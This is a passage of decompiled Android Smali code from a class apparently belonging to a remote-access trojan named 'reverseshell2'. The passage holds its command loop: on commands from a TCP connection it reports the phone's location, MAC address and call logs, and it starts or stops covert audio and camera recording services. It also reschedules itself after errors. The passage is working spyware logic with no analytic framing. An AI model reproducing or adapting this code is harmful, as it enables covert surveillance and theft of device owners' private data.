    invoke-virtual {v11, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    invoke-virtual {v3, v11}, Ljava/io/OutputStream;->write([B)V

    .line 207
    sget-object v3, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    const-string v11, "Wrong Command\n"

    invoke-virtual {v11, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    invoke-virtual {v3, v11}, Ljava/io/OutputStream;->write([B)V

    .line 209
    :goto_8
    sget-object v3, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v4, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/io/OutputStream;->write([B)V

    .line 210
    .end local v0    # "box":[Ljava/lang/String;
    move-object/from16 v4, v16

    move-object/from16 v3, v17

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 211
    :cond_f
    move-object/from16 v17, v3

    const-string v0, "getLocation"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_10

    .line 213
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    const-string v3, "getLocation\n"

    invoke-virtual {v3, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/io/OutputStream;->write([B)V

    .line 214
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->locationManager:Lcom/example/reverseshell2/Payloads/locationManager;

    invoke-virtual {v0}, Lcom/example/reverseshell2/Payloads/locationManager;->getLocation()Ljava/lang/String;

    move-result-object v0

    .line 215
    .local v0, "res":Ljava/lang/String;
    sget-object v3, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    invoke-virtual {v3, v11}, Ljava/io/OutputStream;->write([B)V

    .line 216
    sget-object v3, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v7, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    invoke-virtual {v3, v11}, Ljava/io/OutputStream;->write([B)V

    .line 217
    sget-object v3, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v4, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/io/OutputStream;->write([B)V

    .line 218
    .end local v0    # "res":Ljava/lang/String;
    move-object/from16 v4, v16

    move-object/from16 v3, v17

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 219
    :cond_10
    const-string v0, "startAudio"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    const-string v3, "startFore"

    const-string v12, "ins"

    if-eqz v0, :cond_11

    .line 222
    :try_start_8
    new-instance v0, Landroid/content/Intent;

    iget-object v4, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    const-class v11, Lcom/example/reverseshell2/Payloads/audioManager;

    invoke-direct {v0, v4, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 223
    .local v0, "serviceIntent":Landroid/content/Intent;
    invoke-virtual {v0, v12, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 224
    iget-object v3, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-static {v3, v0}, Landroidx/core/content/ContextCompat;->startForegroundService(Landroid/content/Context;Landroid/content/Intent;)V

    .line 225
    .end local v0    # "serviceIntent":Landroid/content/Intent;
    move-object/from16 v4, v16

    move-object/from16 v3, v17

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 226
    :cond_11
    const-string v0, "stopAudio"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_4

    move-object/from16 v18, v2

    const-string v2, "stopFore"

    if-eqz v0, :cond_12

    .line 229
    :try_start_9
    new-instance v0, Landroid/content/Intent;

    iget-object v3, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    const-class v4, Lcom/example/reverseshell2/Payloads/audioManager;

    invoke-direct {v0, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 230
    .restart local v0    # "serviceIntent":Landroid/content/Intent;
    invoke-virtual {v0, v12, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 231
    iget-object v2, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-static {v2, v0}, Landroidx/core/content/ContextCompat;->startForegroundService(Landroid/content/Context;Landroid/content/Intent;)V

    .line 232
    .end local v0    # "serviceIntent":Landroid/content/Intent;
    move-object/from16 v4, v16

    move-object/from16 v3, v17

    move-object/from16 v2, v18

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 233
    :cond_12
    const-string v0, "startVideo \\d"

    invoke-virtual {v10, v0}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_13

    .line 235
    invoke-virtual {v10, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 236
    .local v0, "cameraid":[Ljava/lang/String;
    new-instance v2, Landroid/content/Intent;

    iget-object v4, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    const-class v11, Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-direct {v2, v4, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 237
    .local v2, "serviceIntent":Landroid/content/Intent;
    invoke-virtual {v2, v12, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 238
    const-string v3, "cameraid"

    const/4 v11, 0x1

    aget-object v4, v0, v11

    invoke-virtual {v2, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 239
    iget-object v3, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-static {v3, v2}, Landroidx/core/content/ContextCompat;->startForegroundService(Landroid/content/Context;Landroid/content/Intent;)V

    .line 241
    .end local v0    # "cameraid":[Ljava/lang/String;
    .end local v2    # "serviceIntent":Landroid/content/Intent;
    move-object/from16 v4, v16

    move-object/from16 v3, v17

    move-object/from16 v2, v18

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 242
    :cond_13
    const/4 v11, 0x1

    const-string v0, "stopVideo"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_14

    .line 244
    new-instance v0, Landroid/content/Intent;

    iget-object v3, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    const-class v4, Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-direct {v0, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 245
    .local v0, "serviceIntent":Landroid/content/Intent;
    invoke-virtual {v0, v12, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 246
    iget-object v2, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-static {v2, v0}, Landroidx/core/content/ContextCompat;->startForegroundService(Landroid/content/Context;Landroid/content/Intent;)V

    .line 247
    .end local v0    # "serviceIntent":Landroid/content/Intent;
    move-object/from16 v4, v16

    move-object/from16 v3, v17

    move-object/from16 v2, v18

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 248
    :cond_14
    const-string v0, "getCallLogs"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_16

    .line 250
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    const-string v2, "callLogs\n"

    invoke-virtual {v2, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/io/OutputStream;->write([B)V

    .line 251
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->readCallLogs:Lcom/example/reverseshell2/Payloads/readCallLogs;

    invoke-virtual {v0}, Lcom/example/reverseshell2/Payloads/readCallLogs;->readLogs()Ljava/lang/String;

    move-result-object v0

    .line 252
    .local v0, "call_logs":Ljava/lang/String;
    if-nez v0, :cond_15

    .line 253
    sget-object v2, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    const-string v3, "No call logs found on the device\n"

    invoke-virtual {v3, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/io/OutputStream;->write([B)V

    .line 254
    sget-object v2, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v4, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/io/OutputStream;->write([B)V

    goto :goto_9

    .line 256
    :cond_15
    sget-object v2, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/io/OutputStream;->write([B)V

    .line 257
    sget-object v2, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v4, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/io/OutputStream;->write([B)V

    .line 260
    .end local v0    # "call_logs":Ljava/lang/String;
    :goto_9
    move-object/from16 v4, v16

    move-object/from16 v3, v17

    move-object/from16 v2, v18

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 261
    :cond_16
    const-string v0, "getMACAddress"

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_17

    .line 263
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->ipAddr:Lcom/example/reverseshell2/Payloads/ipAddr;

    const/4 v2, 0x0

    invoke-static {v2}, Lcom/example/reverseshell2/Payloads/ipAddr;->getMACAddress(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 264
    .local v0, "macAddress":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object v0, v2

    .line 265
    sget-object v2, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {v0, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/io/OutputStream;->write([B)V

    .line 266
    .end local v0    # "macAddress":Ljava/lang/String;
    move-object/from16 v4, v16

    move-object/from16 v3, v17

    move-object/from16 v2, v18

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 269
    :cond_17
    sget-object v0, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    const-string v2, "Unknown Command \n"

    invoke-virtual {v2, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/io/OutputStream;->write([B)V

    move-object/from16 v4, v16

    move-object/from16 v3, v17

    move-object/from16 v2, v18

    const/16 v11, 0x15

    const/4 v12, 0x1

    goto/16 :goto_3

    .line 272
    :cond_18
    invoke-static {v6, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 273
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x15

    if-lt v0, v2, :cond_19

    .line 274
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    iget-object v2, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-virtual {v0, v2}, Lcom/example/reverseshell2/functions;->jobScheduler(Landroid/content/Context;)V

    goto :goto_a

    .line 276
    :cond_19
    iget-object v0, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    new-instance v2, Lcom/example/reverseshell2/tcpConnection$4;

    invoke-direct {v2, v1}, Lcom/example/reverseshell2/tcpConnection$4;-><init>(Lcom/example/reverseshell2/tcpConnection;)V

    invoke-virtual {v0, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4

    .line 302
    .end local v10    # "line":Ljava/lang/String;
    .end local v13    # "in":Ljava/io/BufferedReader;
    .end local v14    # "model":Ljava/lang/String;
    .end local v15    # "welcomeMess":Ljava/lang/String;
    :goto_a
    goto :goto_c

    .line 91
    :cond_1a
    move-object/from16 v18, v2

    move-object/from16 v17, v3

    move-object/from16 v16, v4

    goto/16 :goto_0

    .line 283
    :catch_4
    move-exception v0

    .line 284
    .local v0, "e":Ljava/lang/Exception;
    invoke-static {v6, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 285
    iget-object v2, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    new-instance v3, Lcom/example/reverseshell2/tcpConnection$5;

    invoke-direct {v3, v1}, Lcom/example/reverseshell2/tcpConnection$5;-><init>(Lcom/example/reverseshell2/tcpConnection;)V

    invoke-virtual {v2, v3}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 291
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x15

    if-lt v2, v3, :cond_1b

    .line 292
    iget-object v2, v1, Lcom/example/reverseshell2/tcpConnection;->functions:Lcom/example/reverseshell2/functions;

    iget-object v3, v1, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-virtual {v2, v3}, Lcom/example/reverseshell2/functions;->jobScheduler(Landroid/content/Context;)V

    goto :goto_b

    .line 294
    :cond_1b
    iget-object v2, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    new-instance v3, Lcom/example/reverseshell2/tcpConnection$6;

    invoke-direct {v3, v1}, Lcom/example/reverseshell2/tcpConnection$6;-><init>(Lcom/example/reverseshell2/tcpConnection;)V

    invoke-virtual {v2, v3}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 301
    :goto_b
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 303
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_c
    const/4 v2, 0x0

    return-object v2
.end method
